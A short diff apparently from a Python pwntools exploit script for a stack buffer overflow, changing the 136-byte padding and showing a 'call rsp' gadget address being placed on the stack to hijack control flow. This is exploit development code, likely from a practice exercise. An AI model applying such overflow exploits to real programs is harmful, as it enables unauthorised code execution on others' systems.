@@ -36,7 +36,7 @@ if __name__ == "__main__":
     # process_to_exploit = gdb.debug(local_binary_file)
 
     # To overflow the buffer, I prepare to send 128+8 bytes.
-    buffer_overflower = b"0"*136
+    buffer_overflower = b"3"*136
 
     # I also prepare to put the address of the "call rsp" instruction on the stack.
     instruction_redirect = p64(call_rsp_address)
